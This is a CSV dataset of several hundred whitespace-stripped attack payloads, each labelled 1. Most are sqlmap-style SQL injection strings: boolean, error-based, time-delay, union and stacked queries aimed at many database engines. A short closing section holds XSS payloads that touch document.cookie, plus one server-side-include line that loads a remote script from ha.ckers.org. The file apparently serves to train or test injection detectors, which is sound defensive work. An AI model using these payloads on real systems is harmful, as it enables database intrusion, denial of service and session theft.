payload,attack_type,label
"1')orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))and('blnh'like'blnh",sqli,1
"1'))andexp(~(select*from(selectconcat(0x7171706a71,(select(elt(8190=8190,1))),0x717a767a71,0x78))x))and(('kqqf'='kqqf",sqli,1
1'+(select'kiqf'where5920=5920;select(casewhen(4666=4666)then1else4666*(select4666frommaster..sysdatabases)end)--,sqli,1
"1"")))and(3020=3020)*6703and(((""fqap""like""fqap",sqli,1
-6014'))or(9860=4848)*4848and(('qtge'='qtge,sqli,1
"1%""))and8407=(selectcount(*)fromgenerate_series(1,5000000))and((""%""=""",sqli,1
1;select(casewhen(4769=4769)then4769else4769*(select4769frommysql.db)end)#,sqli,1
-8099%'))or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and(('%'=',sqli,1
"1')where6772=6772androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)--",sqli,1
"-8178)unionallselect4163,4163,4163,4163,4163,4163,4163--",sqli,1
"1;selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4#ljph",sqli,1
"1')))or4411=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and((('narn'='narn",sqli,1
"1')))or2367=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"-5963""or9323=9323#",sqli,1
"1')));selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3and((('squj'='squj",sqli,1
"1"")and(5452=6050)*6050and(""ciyc""like""ciyc",sqli,1
"1%"";selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4and""%""=""",sqli,1
"1"")asiwriwhere4921=4921or(select*from(select(sleep(5)))ydpu)--",sqli,1
"1"")))waitfordelay'0:0:5'and(((""tuhy""like""tuhy",sqli,1
1'+(selectsoqkwhere5383=5383;selectpg_sleep(5)--,sqli,1
1'where5455=5455andsleep(5)--,sqli,1
"1'+(selectzfpkwhere9784=9784or4411=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7))+'",sqli,1
"1'))or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)and(('kmjn'='kmjn",sqli,1
"1%')));selectbenchmark(5000000,md5(0x4c4d6142))and((('%'='",sqli,1
"1%""))orderby1--",sqli,1
"-8772%"")unionallselect5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",sqli,1
"1""where9901=9901and(2455=8499)*8499--",sqli,1
1')));selectcasewhen2948=7279then1elsenullend--,sqli,1
"1""))ashfmawhere2654=2654andmake_set(8403=8403,8899)--",sqli,1
-4171')unionallselect6136#,sqli,1
"1)asghewwhere6441=6441unionallselectnull,null--",sqli,1
"-9263')asqodgwhere6798=6798or5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(5023=5023)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1
-7648')or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric),sqli,1
"1orrow(1045,7562)>(selectcount(*),concat(0x7171706a71,(select(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))xfrom(select8488unionselect5584unionselect3051unionselect1210)agroupbyx)--fwzl",sqli,1
"1)where2010=2010;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"-3747"")unionallselect8962,8962,8962,8962,8962#",sqli,1
"1"")))and8594=(select8594frompg_sleep(5))--",sqli,1
"1%"")))orelt(5873=5873,sleep(5))#",sqli,1
"-9572%"")or1570=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(1570=1570)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and(""%""=""",sqli,1
"-1993%"")or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and(""%""=""",sqli,1
"1)(select(casewhen(4587=4587)thenregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)elsechar(76)||char(65)||char(102)||char(72)end)from(values(0)))",sqli,1
"1"")))and3707=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and(((""ytju""like""ytju",sqli,1
1);selectsleep(5)#,sqli,1
"-5202unionallselect5332,5332,5332,5332,5332,5332,5332#",sqli,1
"-4934""unionallselect5119,5119,5119,5119,5119--",sqli,1
"1"")and8407=(selectcount(*)fromgenerate_series(1,5000000))and(""wmmg""like""wmmg",sqli,1
"1')))or5356=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"1')))orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and((('nlky'like'nlky",sqli,1
"1""where8732=8732;begindbms_lock.sleep(5);end--",sqli,1
"1',(select(casewhen(3902=3902)then(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)else1/(select0fromdual)end)fromdual)",sqli,1
-5764or3038=3038,sqli,1
"1"")where6903=6903;select(casewhen(8808=1367)then1else8808*(select8808frommaster..sysdatabases)end)--",sqli,1
"1"")))or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and(((""zzcd""=""zzcd",sqli,1
"-5826""))unionallselect7192,7192#",sqli,1
"-6478""))unionallselect7087,7087,7087,7087,7087,7087,7087,7087--",sqli,1
"1')where7658=7658unionallselectnull,null#",sqli,1
"-4166%"")unionallselect5190--",sqli,1
"1%"")));select(casewhen(2140=5325)then2140else2140*(select2140frominformation_schema.character_sets)end)#",sqli,1
"1');selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3and('njnr'='njnr",sqli,1
1))orderby1#,sqli,1
"-5041')))unionallselect4820,4820,4820,4820,4820,4820--",sqli,1
"-2071unionallselect4753,4753--",sqli,1
-5389'||(select'gggl'where1020=1020unionallselect1020#,sqli,1
"1'))orelt(5873=5873,sleep(5))#",sqli,1
"1')and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)",sqli,1
"-8557or1groupbyconcat(0x7171706a71,(select(casewhen(4232=4232)then1else0end)),0x717a767a71,floor(rand(0)*2))havingmin(0)#",sqli,1
"1"");select(casewhen(3855=3855)then3855else1/(select0)end)--",sqli,1
1%')))and3916=6327--,sqli,1
"1')procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)and('szib'like'szib",sqli,1
"1')asnexawhere6740=6740;selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"-9884')orelt(1942=8409,8409)and('tqdq'like'tqdq",sqli,1
"1')asvlwhwhere9403=9403orelt(5873=5873,sleep(5))#",sqli,1
"1)where8856=8856or6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1""where9083=9083and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))--",sqli,1
1%';(select*from(select(sleep(5)))acdk)#,sqli,1
"-2289"")or8624=6279and(""ised""=""ised",sqli,1
"1')))and8189=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
1where3502=3502orderby1--,sqli,1
"1'))and4241=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(4241=4241)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and(('pydi'like'pydi",sqli,1
1')and6969=(select6969frompg_sleep(5))and('ifvz'like'ifvz,sqli,1
1)))rlikesleep(5)#,sqli,1
-4239or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))--xacp,sqli,1
1'and6969=(select6969frompg_sleep(5))and'lqsa'like'lqsa,sqli,1
-9389')orderby1#,sqli,1
"-1907""))or2782=3591",sqli,1
1where3802=3802and2006=2006,sqli,1
"-2110'or1groupbyconcat(0x7171706a71,(select(casewhen(4232=4232)then1else0end)),0x717a767a71,floor(rand(0)*2))havingmin(0)#",sqli,1
1)asuurowhere6784=6784;if(7899=7899)select7899elsedropfunctionzbbp--,sqli,1
"1""))astsrywhere6594=6594orrow(1045,7562)>(selectcount(*),concat(0x7171706a71,(select(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))xfrom(select8488unionselect5584unionselect3051unionselect1210)agroupbyx)--",sqli,1
"1%"");select(casewhen(1898=4705)then1898else1/(select0)end)--",sqli,1
"1'+(select'uqaf'where7414=7414;iif(5257=5257,1,1/0)",sqli,1
"1""and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))",sqli,1
1'+(selectijohwhere7145=7145orderby1--,sqli,1
"1""))asturjwhere1237=1237;createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)--",sqli,1
"1)))and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and(((4234=4234",sqli,1
1';select(casewhen(3681=5989)then3681elsecast(1asint)/(select0fromdual)end)fromdual--,sqli,1
"-7491"")ascnrnwhere3635=3635orderby1#",sqli,1
"1'inbooleanmode)orrow(1045,7562)>(selectcount(*),concat(0x7171706a71,(select(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))xfrom(select8488unionselect5584unionselect3051unionselect1210)agroupbyx)#",sqli,1
"1""))unionallselectnull,null,null,null,null,null,null,null--",sqli,1
"-1275""unionallselect7861,7861,7861,7861,7861#",sqli,1
"1"")assrawwhere1997=1997and(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(3484=3484,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))--",sqli,1
"-5798""or5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(5023=5023)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1
"-8448%""or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and""%""=""",sqli,1
"1)))or4915=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1"";(select*from(select(sleep(5)))srmq)",sqli,1
1)or6793=(select6793frompg_sleep(5))and(7015=7015,sqli,1
1%')and9226=7542--,sqli,1
"-5245'orelt(1032=1032,3623)and'qfvo'='qfvo",sqli,1
-1879%'))or3038=3038,sqli,1
"1)aslfrawhere2669=2669andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1
"1)andmake_set(8403=8403,8899)and(9761=9761",sqli,1
1)andsleep(5),sqli,1
"1%""));iif(7011=2522,1,1/0)",sqli,1
(7098=7098andsleep(5)),sqli,1
1'+(select'tbfj'where4016=4016;select(casewhen(3855=3855)then3855else1/(select0)end)--,sqli,1
"-4408"")or6872=6872and(""oenu""=""oenu",sqli,1
"1'))and3824=benchmark(5000000,md5(0x76555642))and(('bemh'='bemh",sqli,1
"1'||(select'neqi'where6873=6873unionallselectnull,null,null,null,null,null,null--",sqli,1
-8051)or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and(5637=5637,sqli,1
"1%"")))androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)and(((""%""=""",sqli,1
"1"";waitfordelay'0:0:5'",sqli,1
"1""))asdaqdwhere4390=4390andelt(3114=3114,sleep(5))#",sqli,1
1')))and2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(2853=2853)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)and((('iuki'='iuki,sqli,1
"1%""))unionallselectnull,null,null,null,null--",sqli,1
"1""unionallselectnull,null,null--",sqli,1
"1%')))procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)and((('%'='",sqli,1
-3666')where6386=6386unionallselect6386--,sqli,1
-3100')or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and('etuj'like'etuj,sqli,1
"1"");select*fromgenerate_series(9434,9434,casewhen(9434=3991)then1else0end)limit1--",sqli,1
1%'))rlike(select*from(select(sleep(5)))sgvo)and(('%'=',sqli,1
"-7916'))unionallselect9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",sqli,1
"1"")));select(casewhen(3855=3855)then3855else1/(select0)end)--",sqli,1
"1')where8268=8268unionallselectnull,null,null,null--",sqli,1
"-2072"")asrjczwhere2491=2491or6872=6872--",sqli,1
"1""where9241=9241unionallselectnull#",sqli,1
"1)))orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(((2952=2952",sqli,1
"1""))and3715in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(3715=3715)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and((""bcxh""like""bcxh",sqli,1
"-8933)asiiyrwhere1974=1974unionallselect1974,1974,1974,1974,1974#",sqli,1
"1'))or(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(8113=8113,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and(('gyre'='gyre",sqli,1
"1"";select(casewhen(4666=4666)then1else4666*(select4666frommaster..sysdatabases)end)--",sqli,1
"-7107"")))orderby1#",sqli,1
"1%""or(select9173from(selectcount(*),concat(0x7171706a71,(select(elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)and""%""=""",sqli,1
"-2116%')))unionallselect7119,7119,7119,7119,7119--",sqli,1
1'+(select'ueak'where7329=7329and2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(2853=2853)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric))+',sqli,1
1)and(7557=1711)*1711and(5157=5157,sqli,1
-5708where3134=3134or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')--,sqli,1
-6165%'))unionallselect5384#,sqli,1
1)))and(select*from(select(sleep(5)))fzno)and(((1601=1601,sqli,1
"-4919)unionallselect2608,2608,2608,2608,2608,2608#",sqli,1
1'))asqswuwhere6377=6377;selectcasewhen5433=6458then1elsenullend--,sqli,1
-3956')or(8459=8459)*4906and('rflo'like'rflo,sqli,1
"1""))asccjkwhere1932=1932or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1')unionallselectnull,null,null#",sqli,1
"1%"")and8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
-6190')))unionallselect9413--,sqli,1
"-3819')))unionallselect9014,9014,9014,9014,9014,9014--",sqli,1
"1"")unionallselectnull,null,null,null--",sqli,1
1'))asxqamwhere6750=6750;select(casewhen(4205=9574)then4205else1/(select0)end)--,sqli,1
"1""and(select9067from(selectcount(*),concat(0x7171706a71,(select(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)and""jcgh""=""jcgh",sqli,1
"1%"";selectpg_sleep(5)--",sqli,1
"-3710))unionallselect5770,5770,5770,5770,5770,5770,5770#",sqli,1
"1))asxeblwhere3105=3105or8421=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"1%""))waitfordelay'0:0:5'--",sqli,1
"1%')));selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"1)askjsdwhere1670=1670or1022=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1or4411=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)#zcyc",sqli,1
"1%"")and9254=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"-9772'or5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(5023=5023)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and'igaa'='igaa",sqli,1
"-7611)astujewhere6101=6101unionallselect6101,6101,6101,6101,6101,6101,6101,6101--",sqli,1
"1'))orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))and(('luoj'='luoj",sqli,1
-3161')or8501=1796,sqli,1
-7532)))or4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4493=4493)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and(((8332=8332,sqli,1
"1'+(select'zohk'where5502=5502or2367=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1)))orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))and(((4510=4510",sqli,1
"1;selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3--",sqli,1
"-7234"")unionallselect3154,3154,3154,3154#",sqli,1
"1'))andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"-6357"")orderby1--",sqli,1
1)asnwfzwhere7365=7365and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1
"1%')andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)and('%'='",sqli,1
"1'))ascwsswhere9720=9720;selectlike('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1where2146=2146or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"-4670""))or3038=3038",sqli,1
"1')assjziwhere8242=8242and9254=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1'||(select'bqhi'fromdualwhere7409=7409;callregexp_substring(repeat(right(char(3702),0),500000000),null))||'",sqli,1
"1'where7910=7910;select*fromgenerate_series(4592,4592,casewhen(4592=4592)then1else0end)limit1--",sqli,1
1%'))and3721=2597#,sqli,1
"1')where4297=4297or2367=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1%""unionallselectnull,null,null,null,null,null,null,null,null,null--",sqli,1
-5861')or1581=2611and('mvjh'like'mvjh,sqli,1
1)waitfordelay'0:0:5'and(2993=2993,sqli,1
"-9456%""))or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)and((""%""=""",sqli,1
"1)procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)and(6986=6986",sqli,1
"1%"")))orchar(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
-7562)or8571=8571--,sqli,1
"-9736'ormake_set(7311=2067,2067)and'czdt'like'czdt",sqli,1
"1)asahfjwhere4776=4776or7417=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1andelt(2770=3669,3669)#sfls",sqli,1
"1%"")and4241=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(4241=4241)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and(""%""=""",sqli,1
"1'and8407=(selectcount(*)fromgenerate_series(1,5000000))",sqli,1
1'))and3526=1354,sqli,1
"1%"")unionallselectnull,null,null,null--",sqli,1
"-5827"")aslskqwhere7683=7683unionallselect7683,7683,7683,7683,7683#",sqli,1
"1""))aslftewhere3811=3811orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))--",sqli,1
1'))or(select*from(select(sleep(5)))sddo)#,sqli,1
"-1413"")unionallselect6651,6651,6651--",sqli,1
"1)))and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))and(((6265=6265",sqli,1
"-8419)where8692=8692unionallselect8692,8692,8692--",sqli,1
1where3735=3735;waitfordelay'0:0:5'--,sqli,1
"1')asakvnwhere8669=8669;select*fromgenerate_series(3990,3990,casewhen(3990=9597)then1else0end)limit1--",sqli,1
"1%');callregexp_substring(repeat(right(char(3702),0),500000000),null)and('%'='",sqli,1
-2658)ascasiwhere7364=7364or8245=9651--,sqli,1
1'||(select'ocmk'fromdualwhere3961=3961or6793=(select6793frompg_sleep(5)))||',sqli,1
-4906')))or4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4493=4493)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and((('pkrq'='pkrq,sqli,1
-5336')where8691=8691or3608=1887--,sqli,1
"1""))and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq')and((""mjkl""=""mjkl",sqli,1
"1')andelt(4249=4249,7259)",sqli,1
"1')))andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71))and((('hllf'='hllf",sqli,1
"1""))astfjhwhere1134=1134and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"-6595""orderby1--",sqli,1
"-9659)))unionallselect8665,8665,8665,8665,8665,8665,8665--",sqli,1
"1"")aszhlfwhere4119=4119or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1%""andmake_set(2905=5725,5725)and""%""=""",sqli,1
"1%""or(select2*(if((select*from(selectconcat(0x7171706a71,(select(elt(8113=8113,1))),0x717a767a71,0x78))s),8446744073709551610,8446744073709551610)))and""%""=""",sqli,1
"1""))asoiqrwhere4073=4073or8156=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"-8025"")or(1436=4186)*4186and(""sqwv""like""sqwv",sqli,1
"1'))andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(('swjk'='swjk",sqli,1
1'))and(3020=3020)*6703and(('mgfd'='mgfd,sqli,1
"1))procedureanalyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select(casewhen(5840=5840)then1else0end)),0x717a767a71)),1)and((3102=3102",sqli,1
"1'));selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3and(('zaru'='zaru",sqli,1
"1')astsgewhere6970=6970;selectcount(*)fromgenerate_series(1,5000000)--",sqli,1
1%'));selectsleep(5)#,sqli,1
"-3270%'orelt(9404=3498,3498)and'%'='",sqli,1
"1'||(select'lxpg'where7390=7390and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5))||'",sqli,1
"1%""))andmake_set(8403=8403,8899)and((""%""=""",sqli,1
"1'))or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))and(('gxpr'='gxpr",sqli,1
"1"")));select(casewhen(4660=4660)then4660elsecast(1asint)/(select0fromdual)end)fromdual--",sqli,1
"1')and2388=benchmark(5000000,md5(0x6d457153))#",sqli,1
"1"")where4905=4905andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"1""and3580=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1"")));selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3and(((""mkal""like""mkal",sqli,1
"1'||(select'kbvq'where9279=9279andextractvalue(7982,concat(0x5c,0x7171706a71,(select(elt(7982=7982,1))),0x717a767a71)))||'",sqli,1
"-4869%'unionallselect5729,5729,5729--",sqli,1
"1%'))and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))and(('%'='",sqli,1
"1%""))or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and((""%""=""",sqli,1
-7663'))or1558=1104and(('wsrq'='wsrq,sqli,1
"1'and3580=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1))asoqfrwhere6426=6426andmake_set(8403=8403,8899)--",sqli,1
"-7776')or5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(5023=5023)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and('ihof'='ihof",sqli,1
"-6093')where9676=9676unionallselect9676,9676,9676,9676,9676,9676--",sqli,1
"1"")where9248=9248;if(6767=5022)select6767elsedropfunctionbuii--",sqli,1
"-3758'))unionallselect9460,9460,9460,9460,9460,9460,9460,9460--",sqli,1
"1%');selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
"-1<brsize=""&{document.cookie=true}"">",xss,1
alert(1)><br><br><br><br><br><br>...<br><br><br><br><inputautofocus>,xss,1
">""<imgsrc=&{document.cookie=true;};>",xss,1
<objectclassid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><paramname=urlvalue=javascript:document.cookie=true></object>,xss,1
write(1)autofocus>,xss,1
"<!--#execcmd=""/bin/echo'<scriptsrc'""--><!--#execcmd=""/bin/echo'=http://ha.ckers.org/xss.js></script>'""-->",xss,1
"<imgsrc=""javascript:alert('crosssitescripting');"">",xss,1
">""<styletype=""text/javascript"">document.cookie=true;</style>",xss,1
"<imgsrc=""blah""onmouseover=""document.cookie=true;"">",xss,1
"<bodybackground=javascript:'""><script>alert(xss)</script>></body>",xss,1
">""<iframesrc=""javascript:document.cookie=true;""></iframe>",xss,1
"<imgsrc=""livescript:document.cookie=true;"">",xss,1
"-1<imgsrc=""mocha:document.cookie=true;"">",xss,1
"geturl(""javascript:alert('xss')"")",xss,1
prompt(1);>,xss,1
<objectclassid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><paramname=urlvalue=javascript:alert('crosssitescripting')></object>,xss,1
